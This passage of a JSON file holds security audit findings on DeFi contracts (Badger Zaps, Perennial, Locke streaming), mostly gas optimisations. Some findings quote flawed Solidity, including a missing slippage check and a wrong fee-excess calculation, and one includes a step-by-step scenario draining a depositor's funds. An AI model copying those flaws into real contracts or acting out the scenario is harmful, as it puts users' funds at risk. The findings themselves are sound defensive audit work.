    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\n`settPeak.mint()` and `byvWbtcPeak.mint()` are `blockLocked`, check if locked before calling them can allow blocklocked transactions to fail earlier and save gas.\n\nhttps://github.com/Badger-Finance/ibbtc/blob/d8b95e8d145eb196ba20033267a9ba43a17be02c/contracts/Zap.sol#L93-L116\n\n```solidity=93\nfunction mint(IERC20 token, uint amount, uint poolId, uint idx, uint minOut)\n    external\n    defend\n    blockLocked\n    whenNotPaused\n    returns(uint _ibbtc)\n{\n    token.safeTransferFrom(msg.sender, address(this), amount);\n\n    Pool memory pool = pools[poolId];\n    if (poolId < 3) { // setts\n\n        _addLiquidity(pool.deposit, amount, poolId + 2, idx); // pools are such that the #tokens they support is +2 from their poolId.\n        pool.sett.deposit(pool.lpToken.balanceOf(address(this)));\n        _ibbtc = settPeak.mint(poolId, pool.sett.balanceOf(address(this)), new bytes32[](0));\n    } else if (poolId == 3) { // byvwbtc\n        IbyvWbtc(address(pool.sett)).deposit(new bytes32[](0)); // pulls all available\n        _ibbtc = byvWbtcPeak.mint(pool.sett.balanceOf(address(this)), new bytes32[](0));\n    } else {\n        revert(\"INVALID_POOL_ID\");\n    }\n\n    require(_ibbtc >= minOut, \"INSUFFICIENT_IBBTC\"); // used for capping slippage in curve pools\n    ibbtc.safeTransfer(msg.sender, _ibbtc);\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-badgerzaps-findings",
      "repo": "https://github.com/code-423n4/2021-11-badgerzaps-findings",
      "url": "https://github.com/code-423n4/2021-11-badgerzaps-findings/issues/49"
    }
  },
  {
    "title": "Improper implementation of slippage check",
    "severity": "medium",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/Badger-Finance/ibbtc/blob/d8b95e8d145eb196ba20033267a9ba43a17be02c/contracts/Zap.sol#L216-L238\n\n```solidity=216{229,231-232}\nfunction redeem(IERC20 token, uint amount, uint poolId, int128 idx, uint minOut)\n    external\n    defend\n    blockLocked\n    whenNotPaused\n    returns(uint out)\n{\n    ibbtc.safeTransferFrom(msg.sender, address(this), amount);\n\n    Pool memory pool = pools[poolId];\n    if (poolId < 3) { // setts\n        settPeak.redeem(poolId, amount);\n        pool.sett.withdrawAll();\n        pool.deposit.remove_liquidity_one_coin(pool.lpToken.balanceOf(address(this)), idx, minOut);\n    } else if (poolId == 3) { // byvwbtc\n        byvWbtcPeak.redeem(amount);\n        IbyvWbtc(address(pool.sett)).withdraw(); // withdraws all available\n    } else {\n        revert(\"INVALID_POOL_ID\");\n    }\n    out = token.balanceOf(address(this));\n    token.safeTransfer(msg.sender, out);\n}\n```\n\nIn the current implementation of. `Zap.sol#redeem()`, the outAmount of `IbyvWbtc.withdraw()` is not controlled by `minOut`.\n\n### Recommendation\n\nConsider implementing the `minOut` check in between L236 and L237.\n\n```solidity\n    ...\n    out = token.balanceOf(address(this));\n    require(out >= _minOut, \"Slippage Check\");\n    token.safeTransfer(msg.sender, out);\n}\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-badgerzaps-findings",
      "repo": "https://github.com/code-423n4/2021-11-badgerzaps-findings",
      "url": "https://github.com/code-423n4/2021-11-badgerzaps-findings/issues/47"
    }
  },
  {
    "title": "`Zap.sol#redeem()` Lack of input validation",
    "severity": "minor",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\n`token` should be validated to make sure the user can get the redeemed tokens.\n\nhttps://github.com/Badger-Finance/ibbtc/blob/d8b95e8d145eb196ba20033267a9ba43a17be02c/contracts/Zap.sol#L216-L238\n\n```solidity=216\nfunction redeem(IERC20 token, uint amount, uint poolId, int128 idx, uint minOut)\n    external\n    defend\n    blockLocked\n    whenNotPaused\n    returns(uint out)\n{\n    ibbtc.safeTransferFrom(msg.sender, address(this), amount);\n\n    Pool memory pool = pools[poolId];\n    if (poolId < 3) { // setts\n        settPeak.redeem(poolId, amount);\n        pool.sett.withdrawAll();\n        pool.deposit.remove_liquidity_one_coin(pool.lpToken.balanceOf(address(this)), idx, minOut);\n    } else if (poolId == 3) { // byvwbtc\n        byvWbtcPeak.redeem(amount);\n        IbyvWbtc(address(pool.sett)).withdraw(); // withdraws all available\n    } else {\n        revert(\"INVALID_POOL_ID\");\n    }\n    out = token.balanceOf(address(this));\n    token.safeTransfer(msg.sender, out);\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-badgerzaps-findings",
      "repo": "https://github.com/code-423n4/2021-11-badgerzaps-findings",
      "url": "https://github.com/code-423n4/2021-11-badgerzaps-findings/issues/37"
    }
  },
  {
    "title": "Avoid unnecessary read of array length in for loops can save gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.\n\nhttps://github.com/Badger-Finance/ibbtc/blob/d8b95e8d145eb196ba20033267a9ba43a17be02c/contracts/Zap.sol#L70-L80\n\n```solidity=70\nfor (uint i = 0; i < pools.length; i++) {\n    Pool memory pool = pools[i];\n    pool.lpToken.safeApprove(address(pool.sett), uint(-1));\n    if (i < 3) {\n        ren.safeApprove(address(pool.deposit), uint(-1));\n        wbtc.safeApprove(address(pool.deposit), uint(-1));\n        IERC20(address(pool.sett)).safeApprove(address(settPeak), uint(-1));\n    } else {\n        IERC20(address(pool.sett)).safeApprove(address(byvWbtcPeak), uint(-1));\n    }\n}\n```\n\nAs `pools.length` must be `4`, it can be replaced with a literal `4`.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-badgerzaps-findings",
      "repo": "https://github.com/code-423n4/2021-11-badgerzaps-findings",
      "url": "https://github.com/code-423n4/2021-11-badgerzaps-findings/issues/36"
    }
  },
  {
    "title": "`Zap.sol#mint()` Validation of `poolId` can be done earlier to save gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nCheck if `poolId <= 3` earlier can avoid unnecessary code execution when this check failed.\n\nhttps://github.com/Badger-Finance/ibbtc/blob/d8b95e8d145eb196ba20033267a9ba43a17be02c/contracts/Zap.sol#L93-L112\n\n```solidity=93\nfunction mint(IERC20 token, uint amount, uint poolId, uint idx, uint minOut)\n    external\n    defend\n    blockLocked\n    whenNotPaused\n    returns(uint _ibbtc)\n{\n    token.safeTransferFrom(msg.sender, address(this), amount);\n\n    Pool memory pool = pools[poolId];\n    if (poolId < 3) { // setts\n        _addLiquidity(pool.deposit, amount, poolId + 2, idx); // pools are such that the #tokens they support is +2 from their poolId.\n        pool.sett.deposit(pool.lpToken.balanceOf(address(this)));\n        _ibbtc = settPeak.mint(poolId, pool.sett.balanceOf(address(this)), new bytes32[](0));\n    } else if (poolId == 3) { // byvwbtc\n        IbyvWbtc(address(pool.sett)).deposit(new bytes32[](0)); // pulls all available\n        _ibbtc = byvWbtcPeak.mint(pool.sett.balanceOf(address(this)), new bytes32[](0));\n    } else {\n        revert(\"INVALID_POOL_ID\");\n    }\n```\n\n### Recommendation\n\nChange to:\n\n```solidity=93\nfunction mint(IERC20 token, uint amount, uint poolId, uint idx, uint minOut)\n    external\n    defend\n    blockLocked\n    whenNotPaused\n    returns(uint _ibbtc)\n{\n    require(poolId <= 3, \"INVALID_POOL_ID\");\n\n    token.safeTransferFrom(msg.sender, address(this), amount);\n\n    Pool memory pool = pools[poolId];\n    if (poolId < 3) { // setts\n        _addLiquidity(pool.deposit, amount, poolId + 2, idx); // pools are such that the #tokens they support is +2 from their poolId.\n        pool.sett.deposit(pool.lpToken.balanceOf(address(this)));\n        _ibbtc = settPeak.mint(poolId, pool.sett.balanceOf(address(this)), new bytes32[](0));\n    } else { // byvwbtc\n        IbyvWbtc(address(pool.sett)).deposit(new bytes32[](0)); // pulls all available\n        _ibbtc = byvWbtcPeak.mint(pool.sett.balanceOf(address(this)), new bytes32[](0));\n    }\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-badgerzaps-findings",
      "repo": "https://github.com/code-423n4/2021-11-badgerzaps-findings",
      "url": "https://github.com/code-423n4/2021-11-badgerzaps-findings/issues/35"
    }
  },
  {
    "title": "Remove unnecessary variables can make the code simpler and save some gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2021-12-perennial/blob/fd7c38823833a51ae0c6ae3856a3d93a7309c0e4/protocol/contracts/utils/types/Token18.sol#L163-L166\n\n```solidity=163\nfunction fromTokenAmount(Token18 self, uint256 amount) private view returns (UFixed18) {\n    UFixed18 conversion = UFixed18Lib.ratio(10 ** 18, 10 ** uint256(decimals(self)));\n    return UFixed18.wrap(amount).mul(conversion);\n}\n```\n\n`conversion` is unnecessary. The code above can be changed to:\n\n```solidity=163\nfunction fromTokenAmount(Token18 self, uint256 amount) private view returns (UFixed18) {\n    return UFixed18.wrap(amount).mul(UFixed18Lib.ratio(10 ** 18, 10 ** uint256(decimals(self))));\n}\n```\n\nhttps://github.com/code-423n4/2021-12-perennial/blob/fd7c38823833a51ae0c6ae3856a3d93a7309c0e4/protocol/contracts/utils/types/Token18.sol#L151-L154\n\n```solidity=151\nfunction toTokenAmount(Token18 self, UFixed18 amount) private view returns (uint256) {\n    UFixed18 conversion = UFixed18Lib.ratio(10 ** uint256(decimals(self)), 10 ** 18);\n    return UFixed18.unwrap(amount.mul(conversion));\n}\n```\n\n`conversion` is unnecessary.\n\nhttps://github.com/code-423n4/2021-12-perennial/blob/fd7c38823833a51ae0c6ae3856a3d93a7309c0e4/protocol/contracts/utils/types/Token18.sol#L137-L142\n\n```solidity=137\nfunction balanceOf(Token18 self, address account) internal view returns (UFixed18) {\n    uint256 tokenAmount = isEther(self) ?\n        account.balance :\n        IERC20(Token18.unwrap(self)).balanceOf(account);\n    return fromTokenAmount(self, tokenAmount);\n}\n```\n\n`tokenAmount` is unnecessary.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-perennial-findings",
      "repo": "https://github.com/code-423n4/2021-12-perennial-findings",
      "url": "https://github.com/code-423n4/2021-12-perennial-findings/issues/39"
    }
  },
  {
    "title": "Inline unnecessary function can make the code simpler and save some gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2021-12-perennial/blob/fd7c38823833a51ae0c6ae3856a3d93a7309c0e4/protocol/contracts/utils/types/Token18.sol#L163-L166\n\n```solidity=163\nfunction fromTokenAmount(Token18 self, uint256 amount) private view returns (UFixed18) {\n    UFixed18 conversion = UFixed18Lib.ratio(10 ** 18, 10 ** uint256(decimals(self)));\n    return UFixed18.wrap(amount).mul(conversion);\n}\n```\n\nhttps://github.com/code-423n4/2021-12-perennial/blob/fd7c38823833a51ae0c6ae3856a3d93a7309c0e4/protocol/contracts/utils/types/Token18.sol#L137-L142\n\n```solidity=137\nfunction balanceOf(Token18 self, address account) internal view returns (UFixed18) {\n    uint256 tokenAmount = isEther(self) ?\n        account.balance :\n        IERC20(Token18.unwrap(self)).balanceOf(account);\n    return fromTokenAmount(self, tokenAmount);\n}\n```\n\n\n`fromTokenAmount()` is unnecessary as it's being used only once. Therefore it can be inlined in `balanceOf()` to make the code simpler and save gas.\n\n## Recommendation\n\nChange to:\n\n```solidity=137\nfunction balanceOf(Token18 self, address account) internal view returns (UFixed18) {\n    uint256 tokenAmount = isEther(self) ?\n        account.balance :\n        IERC20(Token18.unwrap(self)).balanceOf(account);\n    UFixed18 conversion = UFixed18Lib.ratio(10 ** 18, 10 ** uint256(decimals(self)));\n    return UFixed18.wrap(tokenAmount).mul(conversion);\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-perennial-findings",
      "repo": "https://github.com/code-423n4/2021-12-perennial-findings",
      "url": "https://github.com/code-423n4/2021-12-perennial-findings/issues/38"
    }
  },
  {
    "title": "`Incentivizer.sol` Tokens with fee on transfer are not supported",
    "severity": "minor",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nThere are ERC20 tokens that charge fee for every `transfer()` or `transferFrom()`.\n\nIn the current implementation, `Incentivizer.sol#create()` assumes that the received amount is the same as the transfer amount, and uses it to calculate reward amounts.\n\nAs a result, in `claim()`, later users may not be able to successfully claim their rewards, as it may revert at L223 for insufficient balance.\n\nhttps://github.com/code-423n4/2021-12-perennial/blob/fd7c38823833a51ae0c6ae3856a3d93a7309c0e4/protocol/contracts/incentivizer/Incentivizer.sol#L59-L93\n\n```solidity\nfunction create(ProgramInfo calldata info)\nnonReentrant\nisProduct(info.product)\nnotPaused\nexternal returns (uint256) {\n    bool protocolOwned = msg.sender == factory().owner();\n\n    if (_registry[info.product].length() >= programsPerProduct) revert IncentivizerTooManyProgramsError();\n    if (!protocolOwned && msg.sender != factory().owner(info.product))\n        revert NotProductOwnerError(msg.sender, info.product);\n\n    uint256 programId = _programInfos.length;\n    (ProgramInfo memory programInfo, UFixed18 programFee) = ProgramInfoLib.create(fee, info);\n\n    _programInfos.push(programInfo);\n    _programs[programId].initialize(programInfo, protocolOwned);\n    _registry[info.product].add(programId);\n    fees[info.token] = fees[info.token].add(programFee);\n\n    info.token.pull(msg.sender, info.amount.sum());\n\n    emit ProgramCreated(\n        programId,\n        programInfo.product,\n        programInfo.token,\n        programInfo.amount.maker,\n        programInfo.amount.taker,\n        programInfo.start,\n        programInfo.duration,\n        programInfo.grace,\n        programFee\n    );\n\n    return programId;\n}\n```\n\nhttps://github.com/code-423n4/2021-12-perennial/blob/fd7c38823833a51ae0c6ae3856a3d93a7309c0e4/protocol/contracts/incentivizer/Incentivizer.sol#L216-L226\n\n```solidity\nfunction claimInternal(address account, uint256 programId) private {\n    Program storage program = _programs[programId];\n    ProgramInfo memory programInfo = _programInfos[programId];\n\n    program.settle(programInfo, account);\n    UFixed18 claimedAmount = program.claim(account);\n\n    programInfo.token.push(account, claimedAmount);\n\n    emit Claim(account, programId, claimedAmount);\n}\n```\n\n### Recommendation\n\nConsider comparing before and after balance to get the actual transferred amount.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-perennial-findings",
      "repo": "https://github.com/code-423n4/2021-12-perennial-findings",
      "url": "https://github.com/code-423n4/2021-12-perennial-findings/issues/36"
    }
  },
  {
    "title": "`Token18.sol#balanceOf()` When `isEther()`, `fromTokenAmount()` is unnecessary",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nWhen `isEther()`, `decimals` must be `18`:\n\nhttps://github.com/code-423n4/2021-12-perennial/blob/fd7c38823833a51ae0c6ae3856a3d93a7309c0e4/protocol/contracts/utils/types/Token18.sol#L118-L120\n\n```solidity=118\nfunction decimals(Token18 self) internal view returns (uint8) {\n    return isEther(self) ? 18 : IERC20Metadata(Token18.unwrap(self)).decimals();\n}\n```\n\nTherefore, in `Token18.sol#balanceOf()`, `fromTokenAmount()` is unnecessary when `isEther()`.\n\nhttps://github.com/code-423n4/2021-12-perennial/blob/fd7c38823833a51ae0c6ae3856a3d93a7309c0e4/protocol/contracts/utils/types/Token18.sol#L137-L142\n\n```solidity=137\nfunction balanceOf(Token18 self, address account) internal view returns (UFixed18) {\n    uint256 tokenAmount = isEther(self) ?\n        account.balance :\n        IERC20(Token18.unwrap(self)).balanceOf(account);\n    return fromTokenAmount(self, tokenAmount);\n}\n```\n\nCan be changed to:\n\n```solidity=137\nfunction balanceOf(Token18 self, address account) internal view returns (UFixed18) {\n    return isEther(self) ?\n        UFixed18.wrap(account.balance) :\n        fromTokenAmount(self, IERC20(Token18.unwrap(self)).balanceOf(account));\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-perennial-findings",
      "repo": "https://github.com/code-423n4/2021-12-perennial-findings",
      "url": "https://github.com/code-423n4/2021-12-perennial-findings/issues/23"
    }
  },
  {
    "title": "`Token18.sol#push()` When `isEther()`, `toTokenAmount()` is unnecessary",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nWhen `isEther()`, `decimals` must be `18`:\n\nhttps://github.com/code-423n4/2021-12-perennial/blob/fd7c38823833a51ae0c6ae3856a3d93a7309c0e4/protocol/contracts/utils/types/Token18.sol#L118-L120\n\n```solidity=118\n    function decimals(Token18 self) internal view returns (uint8) {\n        return isEther(self) ? 18 : IERC20Metadata(Token18.unwrap(self)).decimals();\n    }\n```\n\nTherefore, in `Token18.sol#push()`, `toTokenAmount()` is unnecessary when `isEther()`.\n\nhttps://github.com/code-423n4/2021-12-perennial/blob/fd7c38823833a51ae0c6ae3856a3d93a7309c0e4/protocol/contracts/utils/types/Token18.sol#L51-L59\n\n```solidity=51\nfunction push(\n    Token18 self,\n    address recipient,\n    UFixed18 amount\n) internal {\n    isEther(self)\n        ? Address.sendValue(payable(recipient), toTokenAmount(self, amount))\n        : IERC20(Token18.unwrap(self)).safeTransfer(recipient, toTokenAmount(self, amount));\n}\n```\n\nCan be changed to:\n\n```solidity=51\nfunction push(\n    Token18 self,\n    address recipient,\n    UFixed18 amount\n) internal {\n    isEther(self)\n        ? Address.sendValue(payable(recipient), UFixed18.unwrap(amount))\n        : IERC20(Token18.unwrap(self)).safeTransfer(recipient, toTokenAmount(self, amount));\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-perennial-findings",
      "repo": "https://github.com/code-423n4/2021-12-perennial-findings",
      "url": "https://github.com/code-423n4/2021-12-perennial-findings/issues/22"
    }
  },
  {
    "title": "Avoid unnecessary external calls can save gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L696-L724\n\n```solidity=696{699-700,708-709}\n    function flashloan(address token, address to, uint112 amount, bytes memory data) public lock {\n        require(token == depositToken || token == rewardToken, \"erc\");\n\n        uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        ERC20(token).safeTransfer(to, amount);\n\n        // the `to` contract should have a public function with the signature:\n        // function lockeCall(address initiator, address token, uint256 amount, bytes memory data);\n        LockeCallee(to).lockeCall(msg.sender, token, amount, data);\n\n        uint256 postDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 postRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        uint112 feeAmt = amount * 10 / 10000; // 10bps fee\n\n        if (token == depositToken) {\n            depositTokenFlashloanFeeAmount += feeAmt;\n            require(preDepositTokenBalance + feeAmt <= postDepositTokenBalance, \"f1\");\n            require(preRewardTokenBalance <= postRewardTokenBalance, \"f2\");\n        } else {\n            rewardTokenFeeAmount += feeAmt;\n            require(preDepositTokenBalance <= postDepositTokenBalance, \"f3\");\n            require(preRewardTokenBalance + feeAmt <= postRewardTokenBalance, \"f4\");\n        }\n\n        emit Flashloaned(token, msg.sender, amount, feeAmt);\n    }\n```\n\nGiven that only one token is related, reading the balanceOf of another token is unnecessary.\n\n### Recommendation\n\nChange to:\n\n```solidity=696\n    function flashloan(address token, address to, uint112 amount, bytes memory data) public lock {\n        require(token == depositToken || token == rewardToken, \"erc\");\n\n        uint256 preTokenBalance = ERC20(token).balanceOf(address(this));\n\n        ERC20(token).safeTransfer(to, amount);\n\n        // the `to` contract should have a public function with the signature:\n        // function lockeCall(address initiator, address token, uint256 amount, bytes memory data);\n        LockeCallee(to).lockeCall(msg.sender, token, amount, data);\n\n        uint256 postTokenBalance = ERC20(token).balanceOf(address(this));\n\n        uint112 feeAmt = amount * 10 / 10000; // 10bps fee\n\n        if (token == depositToken) {\n            depositTokenFlashloanFeeAmount += feeAmt;\n        } else {\n            rewardTokenFeeAmount += feeAmt;\n        }\n        require(preTokenBalance + feeAmt <= postTokenBalance, \"fee\");\n\n        emit Flashloaned(token, msg.sender, amount, feeAmt);\n    }\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-streaming-findings",
      "repo": "https://github.com/code-423n4/2021-11-streaming-findings",
      "url": "https://github.com/code-423n4/2021-11-streaming-findings/issues/262"
    }
  },
  {
    "title": "`Stream#claimReward()` storage writes and reads of `ts.rewards` can be combined into one",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nIn `Stream#claimReward()`, `ts.rewards` is written 2 times and read once. Combing them into one storage write can save gas.\n\nhttps://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L555-L578\n\n```solidity=555{563,569,570}\n    function claimReward() public lock {\n        require(block.timestamp > endRewardLock, \"lock\");\n\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        // accumulate reward per token info\n        cumulativeRewardPerToken = rewardPerToken();\n\n        // update user rewards\n        ts.rewards = earned(ts, cumulativeRewardPerToken);\n        // update users last cumulative reward per token\n        ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n        lastUpdate = lastApplicableTime();\n\n        uint256 rewardAmt = ts.rewards;\n        ts.rewards = 0;\n\n        require(rewardAmt > 0, \"amt\");\n\n        // transfer the tokens\n        ERC20(rewardToken).safeTransfer(msg.sender, rewardAmt);\n\n        emit RewardsClaimed(msg.sender, rewardAmt);\n    }\n```\n\n### Recommendation\n\nChange to:\n\n```solidity=555\n    function claimReward() public lock {\n        require(block.timestamp > endRewardLock, \"lock\");\n\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        // accumulate reward per token info\n        cumulativeRewardPerToken = rewardPerToken();\n\n        uint256 rewardAmt = earned(ts, cumulativeRewardPerToken);\n        require(rewardAmt > 0, \"amt\");\n        // update users last cumulative reward per token\n        ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n        lastUpdate = lastApplicableTime();\n\n        ts.rewards = 0;\n\n        // transfer the tokens\n        ERC20(rewardToken).safeTransfer(msg.sender, rewardAmt);\n\n        emit RewardsClaimed(msg.sender, rewardAmt);\n    }\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-streaming-findings",
      "repo": "https://github.com/code-423n4/2021-11-streaming-findings",
      "url": "https://github.com/code-423n4/2021-11-streaming-findings/issues/259"
    }
  },
  {
    "title": "Gas Optimization On The 2^256-1",
    "body": "# Handle\n\ndefsec\n\n\n# Vulnerability details\n\n## Impact\n\nVarious projects (e.g. Uniswap - https://github.com/Uniswap/interface/blob/main/src/hooks/useApproveCallback.ts#L88 , see here 1 using the constant MaxUint256 from ethers.js) set the default value of the user's allowance to 2^256 - 1. Now the value 2^256 - 1 can also be represented in hex as 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff. From Ethereum's yellow paper we know that zeros are cheaper than non-zero values in the hex representation. Considering this fact, an alternative choice could be now 0x8000000000000000000000000000000000000000000000000000000000000000 or 2^255 to represent \"infinity\". If you do the calculations with Remix, you will see that the former costs 47'872 gas, while the latter costs 45'888 gas. If you accept that infinity can also be represented via 2^255 (instead of 2^256-1) - and I think most projects can live with that - you can already save 1'984 gas (or 4.1%) leveraging this optimisation trick.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n\"https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/LockeERC20.sol#L113\"\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nChange 2^256-1 With 2^255.\n\n## Reference\n\nhttps://ethereum.github.io/yellowpaper/paper.pdf\n\nhttps://forum.openzeppelin.com/t/a-collection-of-gas-optimisation-tricks/19966\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-streaming-findings",
      "repo": "https://github.com/code-423n4/2021-11-streaming-findings",
      "url": "https://github.com/code-423n4/2021-11-streaming-findings/issues/255"
    }
  },
  {
    "title": "Wrong calculation of excess depositToken allows stream creator to retrieve `depositTokenFlashloanFeeAmount`, which may cause fund loss to users",
    "severity": "major",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L654-L654\n\n```solidity=654\nuint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);\n```\n\nIn the current implementation, `depositTokenFlashloanFeeAmount` is not excluded when calculating `excess` depositToken. Therefore, the stream creator can call `recoverTokens(depositToken, recipient)` and retrieve `depositTokenFlashloanFeeAmount` if there are any.\n\nAs a result:\n\n- When the protocol `governance` calls `claimFees()` and claim accumulated `depositTokenFlashloanFeeAmount`, it may fail due to insufficient balance of depositToken.\n- Or, part of users' funds (depositToken) will be transferred to the protocol `governance` as fees, causing some users unable to withdraw or can only withdraw part of their deposits.\n\n### PoC\n\nGiven:\n\n- `feeEnabled`: true\n- `feePercent`: 10 (0.1%)\n\n1. Alice deposited `1,000,000` depositToken;\n2. Bob called `flashloan()` and borrowed `1,000,000` depositToken, then repaid `1,001,000`;\n3. Charlie deposited `1,000` depositToken;\n4. After `endDepositLock`, Alice called `claimDepositTokens()` and withdrawn `1,000,000` depositToken;\n5. `streamCreator` called `recoverTokens(depositToken, recipient)` and retrieved `1,000` depositToken `(2,000 - (1,001,000 - 1,000,000))`;\n6. `governance` called `claimFees()` and retrieved another `1,000` depositToken;\n7. Charlie tries to `claimDepositTokens()` but since the current balanceOf depositToken is `0`, the transcation always fails, and Charlie loses all the depositToken.\n\n### Recommendation\n\nChange to:\n\n```solidity=654\nuint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens) - depositTokenFlashloanFeeAmount;\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-streaming-findings",
      "repo": "https://github.com/code-423n4/2021-11-streaming-findings",
      "url": "https://github.com/code-423n4/2021-11-streaming-findings/issues/241"
    }
  },
  {
    "title": "`LockeERC20.sol#toString()` Implementation can be simpler and save some gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/LockeERC20.sol#L212-L236\n\n```solidity=212{229-232}\n    function toString(uint _i)\n        internal\n        pure\n        returns (string memory) \n    {\n        if (_i == 0) {\n            return \"0\";\n        }\n        uint j = _i;\n        uint len;\n        while (j != 0) {\n            len++;\n            j /= 10;\n        }\n        bytes memory bstr = new bytes(len);\n        uint k = len;\n        while (_i != 0) {\n            k = k-1;\n            uint8 temp = (48 + uint8(_i - _i / 10 * 10));\n            bytes1 b1 = bytes1(temp);\n            bstr[k] = b1;\n            _i /= 10;\n        }\n        return string(bstr);\n    }\n```\n\n### Recommendation\n\nChange to:\n\n```solidity=212{229}\n    function toString(uint _i)\n        internal\n        pure\n        returns (string memory) \n    {\n        if (_i == 0) {\n            return \"0\";\n        }\n        uint j = _i;\n        uint len;\n        while (j != 0) {\n            len++;\n            j /= 10;\n        }\n        bytes memory bstr = new bytes(len);\n        uint k = len;\n        while (_i != 0) {\n            bstr[--k] = bytes1(uint8(48 + _i % 10));\n            _i /= 10;\n        }\n        return string(bstr);\n    }\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-streaming-findings",
      "repo": "https://github.com/code-423n4/2021-11-streaming-findings",
      "url": "https://github.com/code-423n4/2021-11-streaming-findings/issues/239"
    }
  },
  {
    "title": "Constructors should not have visibility",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nVisibility for constructors has been deprecated.\n\nSee: https://github.com/ethereum/solidity/blob/c76a6bdbabb87d9bf98fe833ef9b0fb62fac5913/Changelog.md#070-2020-07-28\n\nSee also:\n\nhttps://github.com/ethereum/solidity/issues/8992\nhttps://github.com/ethereum/solidity/pull/9180\n\nInstances include:\n\nhttps://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L17-L17\n\n```solidity=17\nconstructor(address _governor, address _emergency_governor) public {\n```\n\nhttps://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L263-L280\n```solidity=263{279}\nconstructor(\n    uint64 _streamId,\n    address creator,\n    bool _isSale,\n    address _rewardToken,\n    address _depositToken,\n    uint32 _startTime,\n    uint32 _streamDuration,\n    uint32 _depositLockDuration,\n    uint32 _rewardLockDuration,\n    uint16 _feePercent,\n    bool _feeEnabled\n\n)\n    LockeERC20(_depositToken, _streamId, _startTime + _streamDuration)\n    ExternallyGoverned(msg.sender) // inherit factory governance\n    public \n{\n```\n\nhttps://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L780-L780\n```solidity=780\nconstructor(address _governor, address _emergency_governor) public Governed(_governor, _emergency_governor) {\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-streaming-findings",
      "repo": "https://github.com/code-423n4/2021-11-streaming-findings",
      "url": "https://github.com/code-423n4/2021-11-streaming-findings/issues/236"
    }
  },
  {
    "title": "Remove unnecessary variables can make the code simpler and save some gas",
